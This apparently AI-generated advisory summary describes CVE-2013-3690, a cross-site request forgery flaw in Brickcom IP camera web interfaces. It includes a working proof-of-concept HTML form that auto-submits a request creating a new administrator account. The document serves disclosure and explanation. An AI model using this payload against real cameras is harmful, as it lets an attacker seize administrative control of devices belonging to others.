The provided content contains detailed information about multiple vulnerabilities in various IP camera brands, including CVE-2013-3690.

**CVE-2013-3690:**

*   **Root Cause:** The vulnerability is due to a lack of CSRF protection in the web interface of Brickcom cameras, allowing manipulation of web interface parameters and a privilege escalation from a viewer user to an administrator user.
*   **Weaknesses:**
    *   Cross-Site Request Forgery (CSRF) vulnerability (CWE-352) due to insufficient protection against malicious requests.
    *   Insecure Permissions, Privileges, and Access Controls (CWE-264) allows privilege escalation.
    *   Execution with Unnecessary Privileges (CWE-250).
*   **Impact:** A malicious user can exploit this vulnerability to manipulate the web interface and escalate privileges, potentially gaining full administrative control of the camera.
*  **Attack Vectors:** The attack is performed by crafting a malicious HTML form and tricking an authenticated user into accessing it. The form automatically submits a request to add a new administrator user, leading to privilege escalation.
*   **Required Attacker Capabilities/Position:** The attacker needs to be able to get an authenticated user (even a viewer) to load a malicious web page.

**Technical Details:**

The provided PoC code demonstrates the CSRF and privilege escalation:
```html
<html>
<body>
  <form name="gobap" action="[http://xx.xx.xx.xx/cgi-bin/users.cgi"](http://xx.xx.xx.xx/cgi-bin/users.cgi%22); method="POST">
    <input type="hidden" name="action" value="add">
    <input type="hidden" name="index" value="0">
    <input type="hidden" name="username" value="test2">
    <input type="hidden" name="password" value="test2">
    <input type="hidden" name="privilege" value="1">
    <script>document.gobap.submit();</script>
 </form>
</body>
</html>
```
This HTML form, when loaded by an authenticated user, will send a POST request to the `/cgi-bin/users.cgi` endpoint with parameters to add a new user with administrator privileges (`privilege` set to `1`). This demonstrates both the CSRF vulnerability and the privilege escalation.
